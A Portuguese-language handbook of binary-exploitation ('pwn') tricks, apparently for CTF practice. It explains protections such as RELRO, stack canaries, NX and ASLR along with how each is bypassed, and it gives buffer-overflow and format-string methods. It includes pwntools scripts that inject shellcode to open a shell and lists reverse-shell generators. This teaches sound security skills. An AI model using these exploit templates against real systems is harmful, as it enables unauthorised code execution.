# 1. Introdução

Este material é um handbook com os "macetes" para fazer pwning de forma prática.

# 2. Proteções de binários

## 2.1 RELRO (Relocation Read-Only)

**Funcionamento**

Controla as permissões de escrita em tabelas de dados que contêm ponteiros para funções externas: o GOT (Global Offset Table) e o PLT (Procedure Linkage Table).

- **Partial RELRO**: Apenas algumas partes são protegidas; o GOT é escrito após a resolução de funções (LAZY BINDING) e permanece gravável.
- **Full RELRO**: Todas as relocations são processadas na inicialização (EAGER BINDING). Após a inicialização, todo o GOT se torna somente leitura (read-only).

**Efeito**

Impede ataques que visam modificar ponteiros em áreas de realocação, como GOT (Global Offset Table) e PLT.

**Contorno**

- **Partial RELRO**: Permite Lazy Binding, o GOT é gravável (rw) porque é atualizado em tempo de execução quando uma função externa é chamada pela primeira vez. Modifique o GOT antes que a função a ser explorada seja chamada pela segunda vez.
- **Full RELRO**: Extremamente difícil ou impossível modificar o GOT diretamente. O ataque deve focar em técnicas que não envolvam a escrita no GOT.

## 2.2 Stack Canary/SSP (Stack-Smashing Protector)

**Funcionamento**

1. O compilador insere um valor aleatório de 4 ou 8 bytes (o Canary) na Stack, imediatamente antes do endereço de retorno salvo.
2. O valor do Canary é armazenado em uma área de memória segura.
3. **Antes de a função retornar**, o código gerado pelo compilador verifica se o Canary na Stack corresponde ao valor armazenado.
4. Se a verificação falhar, o programa aborta o processo.

**Efeito**

Impede sobrescrita do `return address` na stack.

**Contorno**

Vazar o **Canary** (endereço de verificação do Stack Canary), mantendo o valor que ele usa como verificação na stack. Ou sobrescrever ponteiros de função na Heap (Heap Overflow) ou em áreas não protegidas pelo Canary.

## 2.3 NX/DEP

**Funcionamento**

Recurso de hardware (CPU) e software (SO). Um bit na entrada da tabela de páginas de memória (`Page Table Entry - PTE`) é marcado. Se o bit NX estiver ativado (1), **o processador não permitirá a busca e execução de instruções nessa página de memória, mesmo que o código tente saltar para lá**.

**Efeito**

Impede com que áreas da memória que deveriam conter apenas dados sejam executadas. Impede injeção de Shellcode na Stack/Heap.

**Contorno**: Usar ROP (Return-Oriented Programming) ou JOP (Jump-Oriented Programming), que reutilizam código do próprio programa, estes estando em áreas com permissão de execução. 

## 2.4 PIE (Position-Independent Executable) + ASLR (Address Space Layout Randomization)

**Funcionamento**

Na inicialização do processo, o sistema operacional carrega a base do executável, bibliotecas compartilhadas (como `libc`), a Stack e a Heap em endereços de memória aleatórios e diferentes a cada execução

**Efeito**

Endereços do executável randomizados toda vez que ele roda. Mesmo que você tenha o executável, os endereços que você obtiver serão inúteis na máquina alvo, onde você tem apenas um `input` e mais nada.

**Contorno**

Vazar endereços.

## 2.5 Fortify Source

Recurso do compilador (GCC/Clang) que substitui chamadas a funções C inseguras (strcpy, memcpy, snprintf) por versões mais seguras em tempo de compilação. Essas versões verificam se o tamanho de destino fornecido pelo programador é excedido e, se houver um estouro, encerram o programa.

**Efeito**

Ajuda a evitar alguns Buffer Overflows simples, mas apenas se o compilador conseguir determinar o tamanho do buffer de destino

# 3. Antes do exploit

1. Verifique informações do arquivo com `file arquivo`
2. Verifique strings úteis com `strings arquivo`
3. Verifique segurança com `pwn checksec arquivo`
4. Abra o programa no Ghidra ou Debugger

# 3. Simple Buffer Overflow

Sobrescrevemos a Stack. Podemos sobrescrever variáveis ou o `return address`.


1. Identifique se é possível fazer BOF
2. Verifique se a variável que queremos sobrescrever está **entre a variável do input e o `rbp` na stack**
3. Se estiver, podemos sobrescrever. **Calcule a distância para chegar no início da variável desejada, e sobrescreva com caracteres quaisquer**.
   1. Basicamente, teremos nosso input como `rbp-0x10`, por exemplo, e a outra variável em `rbp-0x5`. Isso quer dizer que a distância entre eles é `0x10 - 0x5 = 0xb = 11`. Ou seja, para chegarmos no **início** de `rbp-0x5`, precisamos sobrescrever a stack com 11 bytes quaisquer.
   2. Geralmente, usamos caracteres, pois cada caractere = 1 byte e fica fácil de contabilizar.
4. Ao final da string, **coloque o que você deseja que seja sobrescrito na variável**.

# 4. Buffer Overflow - Call Function

Sobrescrevemos o `return address` com um endereço de nossa escolha, de qualquer lugar do código.

1. Identifique se é possível fazer BOF
2. **Calcule a distância entre o início do input e do endereço de retorno** `rbp+0x8` (x64) ou `ebp+0x4` (x32)
   1. Ex: Se a variável está em `rbp-0x10`, a distância é `0x10 + 0x8 = 0x18`.
3. Em uma string, coloque caracteres para preencher essa distância. Ao final, **adicione o endereço de algum lugar do programa onde você queira executar instruções. Pode ser uma função ou qualquer outra coisa**.

Nota: Em alguns executáveis raros, o `return address` pode ser diferente de `rbp+0x8` (x64) ou `ebp+0x4` (x32). Sempre verifique.

## 4.1 Evitando desalinhamento de Stack com PUSH RBP (fraco)

- Se você quer ir a uma instrução no endereço `0x00000001`, substitua por `0x00000001 + 1`. A instrução PUSH RBP que desalinha a stack ocupa 1 byte de memória, e você irá pular ela.

## 4.2 Evitando desalinhamento de Stack com ROP de ret

- Ache o endereço de um `ret`.
  - Com ROPgadget: `ROPgadget`: `ROPgadget -- binary meu_programa | grep "ret"`
  - Ou com pwntools:

```py
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# Encontra endereço de gadget ret
ret_gadgets = rop.find_gadget(['ret'])
print(f"Ret gadget: {hex(ret_gadgets.address)}") # Imprime endereço do gadget
```

- No buffer overflow, coloque **padding + RET Gadget (endereço) + Função alvo (endereço)**:

```
[RBP-0x20] = AAAA...          (bytes de padding)
[RBP+0x00] = RBP antigo        (8 bytes) 
[RBP+0x08] = RET gadget        ← Colocar Gadget aqui. (RIP vai aqui primeiro)
[RBP+0x10] = Função alvo       ← Colocar função alvo aqui. (RIP vai aqui depois)
```

# 5. Buffer Overflow - Shellcode

Shellcode é código assembly. É pequeno. A ideia é colocar na stack, colocar o endereço do início do Shellcode no `return address` e mandar a RIP pra lá.

1. Identifique se é possível fazer BOF
2. Coloque o **Shellcode no Input** + **Padding até `return address`** + **Endereço do início do Shellcode na stack**
3. Sim, acabamos de mandar o `RIP` executar instrução na stack.

Exemplo com pwntools, abrindo uma shell (`shellcraft.sh()`):

```py
from pwn import *

context.binary = ELF('./program')

p = process()

payload = asm(shellcraft.sh())          # Shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffcfb4)              # Endereço do Shellcode

log.info(p.clean())

p.sendline(payload)

p.interactive()
```

## 5.1 ShellCode + pwntools

```py
# Shellcodes prontos populares
shellcraft.sh()           # /bin/sh
shellcraft.cat('file')    # cat file
shellcraft.dupsh()        # Duplica shell para fd
shellcraft.echo('text')   # Imprime texto
shellcraft.exit()         # Sai do processo
shellcraft.findpeersh()   # Encontra peer shell

# Redes
shellcraft.connect('ip', port)
shellcraft.bindsh(port)
shellcraft.reverse('ip', port)

# Sistema de arquivos
shellcraft.getdents(fd)
shellcraft.getcwd()
```

Exemplo: 

```py
#!/usr/bin/env python3
from pwn import *

# Configurar
context.binary = ELF('./program')

p = process()

print("Gerando shellcode /bin/sh...")

# Gerar shellcode
shellcode = asm(shellcraft.sh())

print(f"Shellcode: {len(shellcode)} bytes")
print(hexdump(shellcode))

# Disassemblar para ver as instruções
print("\\nInstruções Assembly:")
print(disasm(shellcode))

# Testar (opcional - descomente para executar)
# print("\\n🚀 Executando shellcode...")
# p = run_shellcode(shellcode)
# p.interactive()
```

# 6. Format Strings

Exploração de printf ou sprintf que aceitam a entrada do usuário diretamente como string de formato (`%s`, `%x`, `%n`). Permite vazar endereço ou escrever GOT/variáveis.

## 6.1 printf

Permite vazar TODA a pilha, pois imprime em sequência tudo que estiver após ESP/RSP antes de chamar `printf`.

1. Identifique se há `printf` onde o primeiro argumento é seu input
2. Se houver, você pode usar format strings como input: `%x %x %x %x`
   1. `%x` - Mostra conteúdo do bloco de memória em hexadecimal. Se o conteúdo for um endereço, vai imprimir.
   2. `%s` - Imprime caracteres em vários blocos de memória até encontrar `\0`. Lê o valor no endereço de memória que foi passado ao %s.
   3. `%n` - Escreve no endereço o número de bytes impressos até agora. (`printf("Hello%n", &count);` => count = 5 no final)
   4. `%p` - Retorna a mesma coisa do `%x`, mas com `0x` na frente
3. Útil: parâmetro arbitrário -> `printf("%6$x);` imprime o 6º parâmetro (Ex: Sabemos que Canary está lá)